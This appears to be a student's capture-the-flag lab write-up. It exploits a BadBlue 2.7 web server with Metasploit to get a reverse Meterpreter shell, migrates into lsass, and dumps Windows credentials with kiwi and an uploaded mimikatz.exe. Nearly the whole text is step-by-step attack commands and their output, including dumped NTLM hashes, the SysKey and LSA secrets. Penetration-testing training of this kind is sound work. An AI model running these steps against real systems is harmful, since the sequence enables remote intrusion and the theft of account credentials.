
# Dumping Hash With Minikatz

### Tools and words
**Mimikatz**\
Credential-stealer

**kiwi**\
Built-in-Mimikatz\
In **Meterpreter**, kiwi is a plugin based on Mimikatz

**BadBlue**\
Light weight Windows web server software - originally designed for file sharing

**lsass**\
Local Security Authority Subsystem Service\
A crucial Windows process resplonsible for:\
\- Enforcing system security policies\
\- Handling user authentication\
\- Creating access tokens

### Practice
```bash
└─# nmap 10.0.24.148
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 06:14 IST
Nmap scan report for 10.0.24.148
Host is up (0.0029s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          BadBlue httpd 2.7    <- BadBlue running on this port
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
# Start Metasploit
msf6 > search badblue
msf6 > use 1
msf6 exploit(windows/http/badblue_passthru) > 
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.24.148
msf6 exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 10.10.43.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (176198 bytes) to 10.0.24.148
[*] Meterpreter session 1 opened (10.10.43.2:4444 -> 10.0.24.148:49956) at 2025-07-18 06:18:55 +0530

# Check system information
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

# Check privilege
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator

# Search for process names lsass
meterpreter > pgrep lsass
788
meterpreter > migrate 788
[*] Migrating from 4384 to 788...
[*] Migration completed successfully.
```

```bash
# kiwi
meterpreter > load kiwi
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                  SHA1
--------       ------         ----                  ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba  fa62275e30d286c09d30
                              9507378dc88d          d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)

# Dump local user account password hashes
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326         <- Flag!
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d     <- Flag

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77
~~~~~~
RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b        <- Flag!

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe
~~~~~~

# Reveals hidden credentials and system secrets stored by Windows
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06
~~~~~~~~
```

```bash
# Upload Mimikatz file
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] Uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Completed  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe

# Start shell and create Temp directory
meterpreter > shell
Process 1888 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>

# Mimikatz file is successfully uploaded
C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Temp

07/18/2025  01:13 AM    <DIR>          .
07/18/2025  01:13 AM    <DIR>          ..
07/18/2025  01:13 AM         1,355,264 mimikatz.exe
               1 File(s)      1,355,264 bytes
               2 Dir(s)  15,976,402,944 bytes free

# Execure mimikatz file
C:\Temp>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

mimikatz # sekurlsa::password
ERROR mimikatz_doLocal ; "password" command of "sekurlsa" module not found !

Module :        sekurlsa
Full name :     SekurLSA module
Description :   Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
~~~~~~~
```
